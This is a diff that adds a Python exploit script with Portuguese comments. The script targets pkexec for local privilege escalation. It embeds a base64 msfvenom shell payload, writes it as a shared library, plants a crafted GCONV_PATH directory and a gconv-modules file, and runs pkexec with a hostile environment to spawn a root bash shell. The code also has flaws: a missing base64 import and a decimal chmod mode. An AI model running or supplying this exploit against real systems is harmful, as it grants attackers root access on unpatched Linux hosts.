@@ -1,0 +1,64 @@
+#!/usr/bin/python3
+from ctypes import *
+from ctypes.util import find_library
+import os
+import sys
+import shutil
+
+# Definir o payload (como já está no seu código)
+payload_byte_msfvenom = b'''
+f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
+AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
+AAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
+AAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
+AAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
+AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
+'''
+payload64 = base64.b64decode(payload_byte_msfvenom)
+
+# Alterando as variáveis de ambiente
+environ = [
+    b'exploit',
+    b'PATH=GCONV_PATH=.',
+    b'LC_MESSAGES=en_US.UTF-8',
+    b'XAUTHORITY=../exploitedWithLove',
+    None
+]
+
+# Limpeza de tentativas anteriores
+if os.path.exists("payload.so"):
+    os.remove("payload.so")
+if os.path.exists("exploit"):
+    shutil.rmtree("exploit")
+if os.path.exists("GCONV_PATH=."):
+    shutil.rmtree("GCONV_PATH=.")
+
+# Criando a biblioteca compartilhada (payload)
+with open('payload.so', 'wb') as f:
+    f.write(payload64)
+os.chmod('payload.so', 755)
+
+# Criando diretórios necessários
+os.mkdir("GCONV_PATH=.")
+with open('GCONV_PATH=./exploit', 'wb') as f:
+    f.write(b'')
+os.chmod('GCONV_PATH=./exploit', 755)
+
+# Criando o diretório 'exploit'
+os.mkdir('exploit')
+
+# Criando o arquivo de configuração do gconf-modules
+with open('exploit/gconv-modules', 'wb') as f:
+    f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n')
+
+# Preparando as variáveis de ambiente
+environ_p = (c_char_p * len(environ))()
+environ_p[:] = environ
+
+# Encontrando a biblioteca libc
+libc = CDLL(find_library('c'))
+
+# Chamando o pkexec com o comando bash para obter uma shell root
+libc.execve(b'/usr/bin/pkexec', (c_char_p(b'pkexec'), c_char_p(b'/bin/bash')), environ_p)
